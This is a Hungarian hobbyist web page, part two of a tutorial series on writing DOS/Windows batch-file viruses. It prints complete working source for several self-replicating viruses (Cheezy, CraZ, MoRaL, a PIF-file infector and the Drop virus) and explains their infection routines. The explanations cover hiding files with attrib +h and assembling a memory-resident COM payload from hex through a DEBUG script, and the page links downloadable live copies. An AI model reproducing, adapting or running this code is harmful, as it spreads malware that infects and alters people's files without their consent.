<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1250">
<title>Nestan </title>
<meta name="GENERATOR" content="Microsoft FrontPage 3.0">
</head>

<body>
<div align="center"><center>

<table border="0" width="100%" cellspacing="0" cellpadding="0">
  <tr>
    <td width="100%" bgcolor="#454545"><p align="center"><font face="Verdana" color="#FFFFFF"><strong><small>BlackCat
    - BATch virii készítése - 2. rész</small></strong></font></td>
  </tr>
</table>
</center></div><div align="center"><center>

<table border="1" width="100%" cellspacing="0" cellpadding="2">
  <tr>
    <td width="100%" bgcolor="#C4C4C4"><font face="Verdana" size="2">&nbsp;</font><p align="center"><strong><font
    face="Verdana" size="2">BATch virii készítése - 2. rész</font></strong></p>
    <p align="left"><font face="Verdana" size="2">Üdv mindenkinek... Eljött a második
    rész, itt az ideje, hogy komolyabb BAT vírusok írásába fogjunk... Elõzõ alkalommal
    kiveséztük az alapokat, egy csomó DOS utasítást megnéztünk, alkalmaztuk õket, megnéztük
    a rekurziót, a goto-t, label-t, a képernyõreírást, a fertõzés alapvetõ
    mechanizmusait, de eddig még mindíg csak bat-okat fertõztünk. Ideje tranzies, avagy
    többplatformos vírusokat gyártani.<br>
    Ja. De még elõtte a szokásos szöveget el kéne mondani. Ezen oldal mûködõ és
    pusztító vírusokat tartalmaz. Maximális óvatosságot kérek, és természetesen
    semmiért nem vállalok felelõsséget. Mindenki a maga kontójára szórakozik. A
    veszélyes fájlokat &quot;!&quot; -el jelöltem meg. Ha lehet, csak valami haver gépén
    indítsd el, vagy csak akkor, ha profi vagy, és tudod mit csinálsz. Fõleg majd most,
    hogy tranziens (többplatformos), assembler-t, bináris kódot, sõt windows registry módosító
    BAT-okat is tárgyalni fogunk... És úgy döntöttem, hogy ennek az egésznek lessz még
    egy harmadik része is, amelyben az ún. trójai BAT vírusokról, és a bat-virgen
    (bat-virus generáló) programokról. És akkor azt mondhatom, hogy profik lettünk, kész
    vagyunk. (Egyszerûen nincs több öteletem. Ha valakinek van, ossza meg velem plíz. Tõlem
    jöhet egy negyedik rész is. (Bár már a tököm kivan vele, már makróznék nagyon.
    (Visual Basic)))...&nbsp;<br>
    Még valami. Az összes példa letölthetõ, meg minden. Használjátok azokat, ne pedig a
    HTML verziójú példányokat (kijelölés és copy-t ne, plíz!), mert érdekes
    eredményre juthattok. Thx.</font></p>
    <p align="left"><font face="Verdana" size="2">Ja. <a href="fprot.log">Itt</a> van az Fprot
    logja, hogy melyik fájl mivel fertõzött.</font></p>
    <p align="left"><font face="Verdana" size="2">&nbsp;</font></p>
    <p align="left"><font face="Verdana" size="2">Talán kezdhetnénk egy rövid
    összefoglalóval:<br>
    <br>
    Elõször néhány nélkülözhetetlen dolog:</font></p>
    <table border="0" width="100%" cellspacing="0" cellpadding="0">
<TBODY>
      <tr>
        <td align="left"><p align="left"><font face="Verdana" size="1"><b>@&nbsp;</b></font></td>
        <td><p align="left"><font face="Verdana" size="1">&nbsp;ha a sor legelején található,
        megakadályozza a parncssor kiírását, még akkor is, ha az echo be van kapcsolva.</font></td>
      </tr>
      <tr>
        <td align="left"><p align="left"><font face="Verdana" size="1"><b>&gt;&nbsp;</b></font></td>
        <td><p align="left"><font face="Verdana" size="1">&nbsp;a kimenetet egy fileba irja a
        képernyõ helyett.</font></td>
      </tr>
      <tr>
        <td align="left"><p align="left"><font face="Verdana" size="1"><b>&gt;&gt;&nbsp;</b></font></td>
        <td><p align="left"><font face="Verdana" size="1">&nbsp;ua. mint &gt; de itt a
        célfájlnak léteznie kell, mert ez a parancs hozzáfûzi a kimenetet a fájlhoz.</font></td>
      </tr>
      <tr>
        <td align="left"><p align="left"><font face="Verdana" size="1"><b>&gt;nul&nbsp;</b></font></td>
        <td><p align="left"><font face="Verdana" size="1">&nbsp;A képernyõkimenetet a semmibe küldi.
        (Nincs kiírás a képernyõre)</font></td>
      </tr>
      <tr>
        <td align="left"><p align="left"><font face="Verdana" size="1"><b>|program...&nbsp;</b></font></td>
        <td><p align="left"><font face="Verdana" size="1">&nbsp;A kimenetet paraméterként
        átadja egy másik programnak.</font></td>
      </tr>
      <tr>
        <td align="left"><p align="left"><font face="Verdana" size="1"><b>::&nbsp;</b></font></td>
        <td><p align="left"><font face="Verdana" size="1">&nbsp;megjegyzés, ua. mint a REM
        utasítás. Az e mögötti dolgok nem hajtódnak végre.</font></td>
      </tr>
      <tr>
        <td align="left"><p align="left"><font face="Verdana" size="1"><b>if exist c:\filename
        goto mylabel&nbsp;</b></font></td>
        <td><p align="left"><font face="Verdana" size="1">&nbsp;megvizsgálja, hogy található e
        fájl, ha igen, akkor a mylabel címkére ugrik&nbsp;</font></td>
      </tr>
      <tr>
        <td align="left"><p align="left"><font face="Verdana" size="1"><b>if not exist filename
        goto mylabel&nbsp;</b></font></td>
        <td><p align="left"><font face="Verdana" size="1">&nbsp;ua. mint az elõzõ, de ez akkor
        ugrik a mylabelre, ha a file nem létezik</font></td>
      </tr>
      <tr>
        <td align="left"><p align="left"><font face="Verdana" size="1"><b>if '%1=='Hey! goto
        Mylabel&nbsp;</b></font></td>
        <td><p align="left"><font face="Verdana" size="1">&nbsp;Megvizsgálja, hogy az elsõ paraméter
        megegyezik e a Hey! szöveggel. Ha igen ugrik a mylabelre.</font></td>
      </tr>
      <tr>
        <td align="left"><p align="left"><font face="Verdana" size="1"><b>set something=This&nbsp;</b></font></td>
        <td><p align="left"><font face="Verdana" size="1">&nbsp;változó definiálása. A
        something nevû változó típusa szöveg, értéke &quot;This&quot;</font></td>
      </tr>
      <tr>
        <td align="left"><p align="left"><font face="Verdana" size="1"><b>echo %something%&nbsp;</b></font></td>
        <td><p align="left"><font face="Verdana" size="1">&nbsp;változók használata. a
        something változó tartalmát a képernyõre írja. (Ez most a This szó!)</font></td>
      </tr>
      <tr>
        <td align="left"><p align="left"><font face="Verdana" size="1"><b>for %%a in (*.bat) do
        call %ViR% InF %%a&nbsp;</b></font></td>
        <td><p align="left"><font face="Verdana" size="1">&nbsp;*.bat fájlokat keres, ha talál
        mindet meghívja a &quot;Vir&quot; változóban lévõ programot az InF változóval, és
        paraméterként az aktuálisan megtalált BAT nevét adja át (%%a).</font></td>
      </tr>
      <tr>
        <td align="left"><p align="left"><font face="Verdana" size="1"><b>if '%1=='InF goto
        mylabel&quot;&nbsp;</b></font></td>
        <td><p align="left"><font face="Verdana" size="1">&nbsp;ua mint az elõzõ, csak minden híváskor
        a Mylabel címkére ugrunk, az aktuális fájlnevet a 2. paraméterben találjuk (%2)</font></td>
      </tr>
</TBODY>
    </table>
    <p align="left"><font face="Verdana" size="2"><br>
    Majd nézzünk egy példát, melyen részletesen elmagyarázom a dolgokat:<br>
    <br>
    <a href="!cheezy.bat">Cheezy virus letölthetõ</a><br>
    <i>::Cheezy Batch ViR<br>
    @echo off&gt;nul.ViR - echo kikapcs<br>
    if '%1=='InF goto ViR_inf - Ugrás a fertõzéshez<br>
    if exist c:\vir.bat goto ViR_run - Ha a gyökérben van vir.bat, akkor már kereshetjük
    is az áldozatot<br>
    if not exist %0.bat goto ViR_end - Ha nincs több bat ebben a könyvtárban, kilép<br>
    find &quot;ViR&quot;&lt;%0.bat&gt;c:\vir.bat - A &quot;Vir&quot;-t keressük, az aktuális
    baton ha találunk, kiteszük a vir.bat-ba (kimásoljuk a virust)<br>
    :ViR_run - Itt keressük az áldozatokat<br>
    for %%a in (*.bat) do call c:\ViR InF %%a - A fertõzést elvégezzük az összes bat-on
    az alkönyvtárban<br>
    goto ViR_end - kilépünk<br>
    :ViR_inf - Itt fertõzünk<br>
    find &quot;ViR&quot;&lt;%2&gt;nul - Megnézzük, hogy a cél már fertõzött e?<br>
    if not errorlevel 1 goto ViR_end - ha már fertõzött, nézzük a következõ fájlt<br>
    type c:\ViR.bat&gt;&gt;%2 - Hozzáfûzzük a virust a talált fájlhoz<br>
    :ViR_end - Ennyi<br>
    </i><br>
    A letölthetõ változat nem tartalmazza a megjegyzéseket -&gt; mûködõképes</font></p>
    <p align="left"><font face="Verdana" size="2">Van még egy kis gyakorolni, és
    ismételnivaló. A fenti vírusnak egy kissé továbbfejlesztett változata, immár
    megjegyzések (kommentek) nélkül, és jóval több dolgot is tartalmaz:<br>
    <br>
    <a href="!craz.bat">CraZ vírus letölthetõ</a><br>
    <i>@goto craz<br>
    :hst_bat<br>
    :: host batch goes here<br>
    @goto CraZend<br>
    :CraZ (version E)<br>
    @echo off%_CraZ%<br>
    if '%1=='#ViR goto CraZ%2<br>
    if not '%CraZ%==' goto hst_bat<br>
    if '%0==' goto hst_bat CraZ<br>
    set CraZ=%0<br>
    set CraZc=%1 %2 %3 %4 %5 %6 %7 %8 %9<br>
    call %0 #ViR hst CraZ<br>
    set CraZs=<br>
    set CraZi=<br>
    set CraZc=%CraZ%<br>
    if exist %CraZ%.bat set CraZc=%CraZ%.bat<br>
    command /e:5000 /c %CraZ% #ViR vir %path%<br>
    set CraZ=<br>
    set CraZc=<br>
    goto CraZend<br>
    :CraZhst<br>
    %0 #ViR hs1 %0 %CraZc%<br>
    :CraZhs1<br>
    shift %_CraZ%<br>
    shift %_CraZ%<br>
    shift %_CraZ%<br>
    goto hst_bat CraZ<br>
    :CraZvir<br>
    if exist %CraZc% %CraZ% #ViR ser .. . %path%<br>
    shift %_CraZ%<br>
    if '%2==' exit CraZ<br>
    set CraZc=%2\%CraZ%.bat<br>
    if not exist %CraZc% set CraZc=%2\%CraZ%<br>
    if not exist %CraZc% set CraZc=%2%CraZ%.bat<br>
    if not exist %CraZc% set CraZc=%2%CraZ%<br>
    goto CraZvir<br>
    :CraZser<br>
    shift %_CraZ%<br>
    if '%2==' exit CraZ<br>
    for %%i in (%2\*a.bat %2*a.bat) do call %CraZ% #ViR inf %%i<br>
    goto CraZser<br>
    :CraZact<br>
    echo [CraZ] has determined this computer to be good food.<br>
    exit CraZ<br>
    :CraZinf<br>
    find &quot;CraZ&quot;&lt;%3&gt;nul<br>
    if not errorlevel 1 goto CraZS<br>
    echo @goto craz&gt;CraZ<br>
    echo :hst_bat&gt;&gt;CraZ<br>
    type %3&gt;&gt;CraZ<br>
    echo.&gt;&gt;CraZ<br>
    find &quot;CraZ&quot;&lt;%CraZc%&gt;&gt;CraZ<br>
    move CraZ %3&gt;nul<br>
    set CraZi=%CraZi%1<br>
    if %CraZi%==11 exit<br>
    :CraZS<br>
    set CraZs=%CraZs%1<br>
    if %CraZs%==1111111111 goto CraZact<br>
    :CraZend<br>
    </i><br>
    Ja. És jut eszembe. A fenti vírus harmadik átirata. :) Errõl már érdemesebb lessz
    néhány szót is szólni, miután átrágtátok a kódot:</font></p>
    <p align="left"><font face="Verdana" size="2"><a href="!moral.bat">Moral vírus letölthetõ<br>
    </a><i>@echo off%_MoRaL%<br>
    if '%1=='ViR goto MoRaL%2<br>
    if '%!%=='111 goto MoRaLend<br>
    if exist C:\MoRaL.bat goto MoRaLrun<br>
    if not exist %0.bat goto MoRaLend<br>
    echo MoRaL|find &quot;x&quot;&gt;nul<br>
    if not errorlevel 1 goto MoRaLend<br>
    find &quot;MoRaL&quot;&lt;%0.bat&gt;C:\MoRaL.bat<br>
    attrib C:\MoRaL.bat +h<br>
    :MoRaLrun<br>
    command /e:5000 /c C:\MoRaL ViR shl<br>
    set !=%!%1%_MoRaL%<br>
    goto MoRaLend<br>
    :MoRaLshl<br>
    C:\MoRaL ViR srh . .. %path%<br>
    :MoRaLsrh<br>
    shift%_MoRaL%<br>
    if '%2==' exit MoRaL<br>
    for %%a in (%2\*.bat) do call C:\MoRaL ViR inf %%a<br>
    goto MoRaLsrh<br>
    :MoRaLinf<br>
    find &quot;MoRaL&quot;&lt;%3&gt;nul<br>
    if not errorlevel 1 goto MoRaLcnt<br>
    type C:\MoRaL.bat&gt;MoRaL.t<br>
    type %3&gt;&gt;MoRaL.t<br>
    move MoRaL.t %3&gt;nul<br>
    set MoRaLi=%MoRaLi%1<br>
    if %MoRaLi%==11 exit<br>
    :MoRaLcnt<br>
    set MoRaLc=%MoRaLc%1<br>
    if not %MoRaLc%==111111111111 goto MoRaLend<br>
    echo.|date|find &quot;Sun&quot;&gt;nul.MoRaL<br>
    if errorlevel 1 exit MoRaL<br>
    set MoRaL=echo<br>
    %MoRaL% -----------------<br>
    %MoRaL% Moral Batch Virus<br>
    %MoRaL% -----------------<br>
    exit MoRaL<br>
    :MoRaLend<br>
    :: this would be the host<br>
    </i><br>
    Ennek a vírusnak van néhány érdekes tulajdonsága. Egy bootolás alkalmával
    mindössze 3-szor fut le, majd kikapcsolja magát, a fertõzések számétól
    függetlenül (1 DOS-session (hátha ez így többet mond, bár nem hiszem...) :) ).
    Minden alkalommal, mikor elindul (Max 3-szor egy session alatt) megpróbál két BAT
    fájlt megfertõzni, de csak akkor, ha ezt kevesebb mint 12 fertõzött fájlt talál a
    vizsgált könyvtárban. Képes az aktuális, és azok alkönyvtárai, valamint a Path
    környezeti változóban megadott elérési utakban talált BAT fájlok megfertõzésére.
    Ha a vizsgált könyvtárban a fertõzött fájlok száma nagyobb min 12, és szombat van,
    akkor megjelenít egy üzenetet. A víruskód minden esetben a célfájl elejére kerül.
    Egy rejtett (hidden) másolata CSAK a víruskódnak a C:\MORAL.BAT alá kerül abból a
    célból, hogy a MORAL üzenet MINDEN esetben indítsa el a víruskódot... Ennyi. Ugye
    érdekes volt? ;)<br>
    <br>
    És eddig tartott az ismétlés, egy kis emlékeztetõ. Nagyon röviden mindent
    átvettünk, sok példával.</font></p>
    <p align="left"><font face="Verdana" size="2">&nbsp;</font></p>
    <p align="left"><font face="Verdana" size="2">Mielõtt azonban komolyabban belefognánk
    szeretnék mutatni valami érdekeset. :) A következõ BAT vírus WINDOWS PIF fájlokat
    fertõz, az egyetlen ilyen, nem olyan rég jutottam hozzá. Különleges csemege, és csak
    az eddig megtanult alapokat használja föl, semmi különleges... tehát nézzük:</font></p>
    <p align="left"><font face="Verdana" size="2">Azé a copyright-ot tarcsuk meg:<br>
    :: Windows PIF Virus (in batch!)<br>
    :: Prog by WaveFunc May 13, 1995<br>
    <br>
    Ez a vírus PIF fájlokat &quot;fertõz&quot; kihasználva a windows azon lehetõségét,
    hogy DOS programokat is futat. A fõ mûködési elve a következõ: Rejtett &quot;kamufájlokat&quot;
    készít, amelyek magát a víruskódot tartalmazzák, és ezeket a fájlokat aztán
    megfelelteti az egyes PIF fájloknak. Pl.: msdos.pif -&gt; msdos.bat. A PIF fájlok
    ezután elindítják a BAT-ot, ami ak pedig elindítják a víruskódot, majd a PIF által
    hivatkozott programot. A &quot;fertõzött&quot; pifek jelölve vannak, így nincsen dupla
    infekcióra mód... A fertõzött fájlok gyógyítására a PIFEDIT program
    használható, mely visszaállítja a fájlneveket, javítja a PIF-et, majd a rejtett
    fájlokat neked kell törölni...<br>
    <br>
    <a href="!pifvirus.bat">Windows PIF Vírus letölthetõ</a><br>
    <i>@echo off<br>
    :: host filename...<br>
    set pifvo=LIST.COM<br>
    :: loop dispatcher...<br>
    if '%1=='PiFV goto PiFV_%2<br>
    :: run the virus!<br>
    set _PiFV=<br>
    if not exist %comspec% set comspec=C:\COMMAND.COM%_PiFV%<br>
    %comspec% /e:5000 /c %0 PiFV go&gt;nul<br>
    if exist PiFV! del PiFV!<br>
    :: run the host<br>
    set PiFVcl=%1 %2 %3 %4 %5 %6 %7 %8 %9<br>
    call %0 PiFV hst<br>
    set PiFVo=<br>
    set PiFVcl=<br>
    :: check for activation...<br>
    echo.|date|find /i &quot;sat&quot;&gt;nul.PiFV<br>
    if errorlevel 1 goto PiFV_end<br>
    echo.|time|find &quot;7&quot;&gt;nul.PiFV<br>
    if errorlevel 1 goto PiFV_msg<br>
    set PiFV=echo<br>
    cls%_PiFV%<br>
    %PiFV%.<br>
    %PiFV% There once was an Otter named Oscer<br>
    %PiFV% Who claimed to know how to make water.<br>
    %PiFV% &quot;No more dams,&quot; he said, &quot;use my water instead!&quot;<br>
    %PiFV% But the Elder Otter was not impressed.<br>
    pause&gt;nul.PiFV<br>
    set PiFV=<br>
    goto PiFV_end<br>
    :PiFV_msg<br>
    echo [PiFV] by WaveFunc<br>
    goto PiFV_end<br>
    :PiFV_hst<br>
    %PiFVo% %PiFVcl%<br>
    goto PiFV_end<br>
    :PiFV_go<br>
    set PiFVh=%0<br>
    if not exist %PiFVh% set PiFVh=%0.bat<br>
    if not exist %PiFVh% exit<br>
    for %%a in (*.pif) do call %0 PiFV inf %%a<br>
    exit PiFV<br>
    :PiFV_inf<br>
    set PiFVp=%3<br>
    :: get victim filename and infection marker<br>
    :: from PIF file using debug...<br>
    if exist PiFV! goto PiFV_1<br>
    echo m 124,162 524&gt;PiFV!<br>
    echo e 100 '@set fn='&gt;&gt;PiFV!<br>
    echo m 524,562 108&gt;&gt;PiFV!<br>
    echo n pifv$.bat&gt;&gt;PiFV!<br>
    echo rcx&gt;&gt;PiFV!<br>
    echo 47&gt;&gt;PiFV!<br>
    echo w&gt;&gt;PiFV!<br>
    echo m 55E,561 108&gt;&gt;PiFV!<br>
    echo e 10C 0&gt;&gt;PiFV!<br>
    echo n pifv$$.bat&gt;&gt;PiFV!<br>
    echo rcx&gt;&gt;PiFV!<br>
    echo 10&gt;&gt;PiFV!<br>
    echo w&gt;&gt;PiFV!<br>
    echo q&gt;&gt;PiFV!<br>
    :PiFV_1<br>
    debug %PiFVp%&lt;PiFV!&gt;nul<br>
    call PiFV$<br>
    set PiFVn=%fn%<br>
    call PiFV$$<br>
    set PiFVi=%fn%<br>
    del PiFV$?.bat<br>
    :: pifvn=orig filename<br>
    :: pifvi=infection marker<br>
    :: pifvp=pif filename<br>
    :: pifvh=companion bat file<br>
    :: skip infected or 'empty' pifs...<br>
    if '%PiFVi%=='PiFV goto PiFV_end<br>
    if '%PiFVn%==' goto PiFV_end<br>
    :: don't shadow command.com (be nice)<br>
    echo %PiFVn%|find /i &quot;command&quot;&gt;nul<br>
    if not errorlevel 1 goto PiFV_end<br>
    :: infectable - create a companion batch...<br>
    :: (the following code strips off the extension)<br>
    echo e 100 e8 16 00 b4 08 cd 21 3c 00 74 0c 3c 2e 74 08 88&gt;PiFV$$<br>
    echo e 110 c2 b4 02 cd 21 eb ec cd 20 ba 21 01 b4 09 cd 21&gt;&gt;PiFV$$<br>
    echo e 120 c3 73 65 74 20 66 6e 3d 24 00&gt;&gt;PiFV$$<br>
    echo n pifv$.com&gt;&gt;PiFV$$<br>
    echo rcx&gt;&gt;PiFV$$<br>
    echo 2a&gt;&gt;PiFV$$<br>
    echo w&gt;&gt;PiFV$$<br>
    echo q&gt;&gt;PiFV$$<br>
    debug&lt;PiFV$$&gt;nul<br>
    echo %PiFVn%|PiFV$&gt;PiFV$$.bat<br>
    call PiFV$$<br>
    set PiFVb=%fn%.bat<br>
    del PiFV$?.*<br>
    :: pifvb=new batch name<br>
    :: do not shadow if comp has same name as host<br>
    if %PiFVo%==%PiFVb% goto PiFV_end<br>
    if exist %PiFVb% goto PiFV_end<br>
    echo @echo off&gt;%PiFVb%<br>
    echo set pifvo=%pifvn%&gt;&gt;%PiFVb%<br>
    find &quot;PiFV&quot;&lt;%PiFVh%&gt;&gt;%PiFVb%<br>
    attrib %PiFVb% +h<br>
    :: ...and point the PIF at the companion<br>
    echo e 15E 'PiFV',0&gt;PiFV$$<br>
    echo e 124 '%PiFVb%',0&gt;&gt;PiFV$$<br>
    echo w&gt;&gt;PiFV$$<br>
    echo q&gt;&gt;PiFV$$<br>
    debug %PiFVp%&lt;PiFV$$&gt;nul<br>
    del PiFV$$<br>
    :: I think we're done!<br>
    exit PiFV<br>
    :PiFV_end<br>
    :: wonder how many bugs all this has in it? Only one<br>
    :: way to find out...<br>
    </i></font></p>
    <p align="left"><font face="Verdana" size="2">Igen, tudom, hogy van benne néhány
    &quot;megmagyarázhatatlan&quot; sor, azok tárgyalására most térnék rá...</font></p>
    <p align="left"><font face="Verdana" size="2">Szóval ezen kis kitérõ után térjünk
    rá a lényegre.&nbsp;<br>
    A következõ egy nagyon elterjedt BAT vírus, mely nagyon sok technikát használ.
    Hallottatok már olyat, hogy BAT vírus rezidens legyen, sõt COM fájlokat és BAT
    fájlokat szintén megfertõz? Na, akkor most láttok egy ilyet. Ezen vírus az összes
    olyan technikát felvonultatja, amit egy tranziens vírusnak tudnia lehet, kivéve talán
    a windows, meg a registry buzerálását, de hát arra már csak a mai BAT vírusok
    képesek. (Ilyenrõl is lesz szó!)<br>
    Ezt nézzétek:<br>
    <br>
    <a href="!drop.bat">Drop vírus letölthetõ</a><br>
    <i>@echo off%_DroP%<br>
    if '%1=='DroP goto DroP_%2<br>
    mem /c|find /i &quot;DroP&quot;&gt;nul<br>
    if not errorlevel 1 goto DroP_r9<br>
    echo n $DroP$.com&gt;DroP.t<br>
    echo e 0100 EB 3F 90&gt;&gt;DroP.t<br>
    echo e 012A 1A 90 00 00 00 00&gt;&gt;DroP.t<br>
    echo e 0130 00 00 00 00 00 00 00 00 00 B8 40 00 FF 00 00 00&gt;&gt;DroP.t<br>
    echo e 0140 00 B0 08 BA 2C 01 E8 3F 01 B0 08 BA 86 01 E8 50&gt;&gt;DroP.t<br>
    echo e 0150 01 B4 2C CD 21 89 16 BE 02 C6 06 3E 01 FF B4 0F&gt;&gt;DroP.t<br>
    echo e 0160 CD 10 3C 06 74 0D 3C 07 74 09 C7 06 38 01 00 B8&gt;&gt;DroP.t<br>
    echo e 0170 EB 07 90 C7 06 38 01 00 B0 BA C0 02 B1 04 D3 EA&gt;&gt;DroP.t<br>
    echo e 0180 42 B4 31 CD 21 90 9C 50 B4 02 CD 16 24 40 74 1B&gt;&gt;DroP.t<br>
    echo e 0190 2E 80 3E 3E 01 00 74 08 2E FE 0E 3E 01 EB 0C 90&gt;&gt;DroP.t<br>
    echo e 01A0 2E 80 3E 3D 01 00 75 03 EB 08 90 58 9D 2E FF 2E&gt;&gt;DroP.t<br>
    echo e 01B0 2C 01 9C 2E FF 1E 2C 01 06 1E 52 51 57 56 0E 1F&gt;&gt;DroP.t<br>
    echo e 01C0 A1 38 01 8E C0 2E 80 3E 3F 01 00 74 0C 8B 3E 30&gt;&gt;DroP.t<br>
    echo e 01D0 01 8B 36 32 01 FB EB 5A 90 C6 06 3D 01 FF FB C6&gt;&gt;DroP.t<br>
    echo e 01E0 06 40 01 64 80 3E 40 01 00 75 03 E9 8B 00 FE 0E&gt;&gt;DroP.t<br>
    echo e 01F0 40 01 E8 B7 00 25 FE 0F 8B F0 26 8A 04 3C 20 74&gt;&gt;DroP.t<br>
    echo e 0200 E3 3C 00 74 DF 81 FE A0 0F 73 D9 8B FE 81 C7 A0&gt;&gt;DroP.t<br>
    echo e 0210 00 81 FF A0 0F 73 44 26 8A 05 3C 20 74 04 3C 00&gt;&gt;DroP.t<br>
    echo e 0220 75 C2 89 3E 30 01 89 36 32 01 C6 06 3F 01 FF EB&gt;&gt;DroP.t<br>
    echo e 0230 48 90 C6 06 3F 01 00 26 8A 04 26 88 05 26 C6 04&gt;&gt;DroP.t<br>
    echo e 0240 20 8B F7 81 C7 A0 00 81 FF A0 0F 73 0E 26 8A 05&gt;&gt;DroP.t<br>
    echo e 0250 3C 20 74 CE 3C 00 74 CA EB 05 90 26 C6 04 20 FF&gt;&gt;DroP.t<br>
    echo e 0260 0E 3A 01 75 0A D0 2E 3C 01 C7 06 3A 01 40 00 E8&gt;&gt;DroP.t<br>
    echo e 0270 3A 00 22 06 3C 01 A2 3E 01 5E 5F 59 5A 1F 07 58&gt;&gt;DroP.t<br>
    echo e 0280 9D 2E C6 06 3D 01 00 CF 50 06 53 55 52 B4 35 CD&gt;&gt;DroP.t<br>
    echo e 0290 21 8B D3 5D 89 56 00 45 45 8C 46 00 5D 5B 07 58&gt;&gt;DroP.t<br>
    echo e 02A0 C3 50 1E 0E 1F B4 25 CD 21 1F 58 C3 A1 BE 02 50&gt;&gt;DroP.t<br>
    echo e 02B0 80 E4 B4 58 7A 01 F9 D1 D0 A3 BE 02 C3 90 00 00&gt;&gt;DroP.t<br>
    echo rcx&gt;&gt;DroP.t<br>
    echo 1C0&gt;&gt;DroP.t<br>
    echo w&gt;&gt;DroP.t<br>
    echo q&gt;&gt;DroP.t<br>
    debug&lt;DroP.t&gt;nul<br>
    del DroP.t<br>
    $DroP$<br>
    del $DroP$.com<br>
    :DroP_r9<br>
    if exist c:\_DroP.bat goto DroP_go<br>
    echo DroP|find &quot;X&quot;&gt;nul<br>
    if not errorlevel 1 goto DroP_end<br>
    if exist %0.bat goto DroP_d1<br>
    if not exist %0 goto DroP_end<br>
    find &quot;DroP&quot;&lt;%0&gt;c:\_DroP.bat<br>
    goto DroP_d2<br>
    :DroP_d1<br>
    find &quot;DroP&quot;&lt;%0.bat&gt;c:\_DroP.bat<br>
    :DroP_d2<br>
    attrib c:\_DroP.bat +h<br>
    :DroP_go<br>
    command /c c:\_DroP DroP sh<br>
    goto DroP_end<br>
    :DroP_sh<br>
    for %%a in (*.bat ..\*.bat) do call c:\_DroP DroP in %%a<br>
    exit DroP<br>
    :DroP_in<br>
    find &quot;DroP&quot;&lt;%3&gt;nul<br>
    if not errorlevel 1 goto DroP_end<br>
    type c:\_DroP.bat&gt;DroP.t<br>
    type %3&gt;&gt;DroP.t<br>
    move DroP.t %3&gt;nul<br>
    exit DroP<br>
    :DroP_end<br>
    :: host batch here<br>
    </i><br>
    Hát akkor vágjunk bele. Elõször lenne itt nény új dolog...<br>
    Az elsõ ami feltûnhet, ezek a szarok:<br>
    <i>echo n $DroP$.com&gt;DroP.t<br>
    echo e 0100 EB 3F 90&gt;&gt;DroP.t<br>
    echo e 012A 1A 90 00 00 00 00&gt;&gt;DroP.t<br>
    echo e 0130 00 00 00 00 00 00 00 00 00 B8 40 00 FF 00 00 00&gt;&gt;DroP.t<br>
    </i>Ezek a sorok nem más, mint hexadecimálisan (16-os számok formájában) felírt
    bináris kód. Az echo ezt elvileg a képernyõre írná ki, de a &gt; illetve &gt;&gt;
    parancsok miatt a Drop.t fájlba írják. A drop.t fájl pedig nem más mint egy debug
    script. A DOS-ban lévõ debugger ezen kódot bináris kóddá alakítja. De nézzünk
    utána, mi is ez a debug nevû progi.&nbsp;<br>
    Egy help kérése után a következõ jelenik meg:<br>
    <br>
    <i>Futtatja Debug, tesztelõ és szerkesztõ és nyomkövetõ programot.<br>
    <br>
    DEBUG [[drive:][path]filename [testfile-parameters]]<br>
    <br>
    [drive:][path]filename - A tesztelni kívánt fájl elérési útja és neve<br>
    testfile-parameters - Olyan paraméterek, melyek szükségesek a tesztelés
    elvégzéséhez<br>
    </i><br>
    Hát ez nem sok info. Ha csak simán elndítjuk a debug.exe-t, akkor egy debug konzolt
    kapunk, hova gépi kódban írhatunk programot (marha hasznos dolog... :) ). De ami ennél
    is fontosabb, egy ? begépelése után elõjönnek a debugger parancsai: (Ezeket nem
    fordítanám le, mert teljesen egyértelmûek. Amik most nekünk kellenének azok úgyis
    csak az e, ill. az n parancsok. N=a bináris fájl neve, amit készíteni akarunk, E=új
    sor, ami hexa adatot tartalmaz):</font></p>
    <p align="left"><font face="Verdana" size="2"><i>assemble A [address]<br>
    compare C range address<br>
    dump D [range]<br>
    enter E address [list]<br>
    fill F range list<br>
    go G [=address] [addresses]<br>
    hex H value1 value2<br>
    input I port<br>
    load L [address] [drive] [firstsector] [number]<br>
    move M range address<br>
    name N [pathname] [arglist]<br>
    output O port byte<br>
    proceed P [=address] [number]<br>
    quit Q<br>
    register R [register]<br>
    search S range list<br>
    trace T [=address] [value]<br>
    unassemble U [range]<br>
    write W [address] [drive] [firstsector] [number]<br>
    allocate expanded memory XA [#pages]<br>
    deallocate expanded memory XD [handle]<br>
    map expanded memory pages XM [Lpage] [Ppage] [handle]<br>
    display expanded memory status XS<br>
    </i><br>
    Máris kész vagyunk értelmezni az elsõ sort. Nos az elsõ sor létrehozza a Drop.t nevû
    fájlt, annak elsõ sorába pedig beírja az <i>n $drop$.com </i>Ezen sor a debug
    parancssori értelmezõ számára azt jelenti, hogy hozza létre a $drop$.com nevû fájlt.
    Azt hiszem érdemes lenne megnéznetek a következõ un. DEBUG scriptet, ami nem más mint
    a $drop$.t, amibol a debug.exe a com fájlt elkészíti. Érdemes megnézni. <a
    href="!DroP.t">ITT</a> van. Ha még mindíg nem tiszta, a fent vírusból készítettem
    egy kivonatot, ami elkészíti a drop.t fájlt, abból pedig a drop.com-ot. NEM FERTÕZ,
    csak a debug használatát mutatja be. Érdemes megnézni/elindítni! <a
    href="demodebug.bat">ITT</a> található! Ja. Oszt a drop memóriarezidens kódját meg
    megtaláljátok egy külön fájlban, RAR-al csomagolva, <a href="!DROP.rar">ITT</a>. No.
    Most már kezd világosodni? Nem? Nézzük a második sort: <i>echo e 0100 EB 3F
    90&gt;&gt;DroP.t </i>Ugye emléxünk? A Drop.t fájlhoz hozáfûzzük ezt a sort, <i>e
    0100 EB 3F 90</i> ,ami megmondja a debuggernek, hogy (E=Enter - Nézd a debugnak a
    parancs-helpjét) ezen sort már fordítsa bináris kóddá. Egyébként a fent látható
    sor egy COM fájl header-je, azaz fejléce... És ugyanígy a többi sor. Az utolsó
    néhány sor azonban megint érdekesen alakul: <i>echo rcx&gt;&gt;DroP.t </i>Az RCX, pedig
    ha figyelmesen elolvastuk a helpet, nem más mint a CX regiszter kiírása. (R=Register -
    lásd:parancsok, CX-regiszter (assembler)). <i>echo 1C0&gt;&gt;DroP.t </i>ez a sor
    számunkra érdektelen, csak nem akartam kihagyni, nehogy megkavarjon valakit. <i>echo
    w&gt;&gt;DroP.t </i>Mit is jelent a w? (W=write) Vagyis az eddig, a debug scriptben
    megadott (E betuvel kezdodo sorokat) ne csak leforditsa, hanem irja is ki com fájlba.
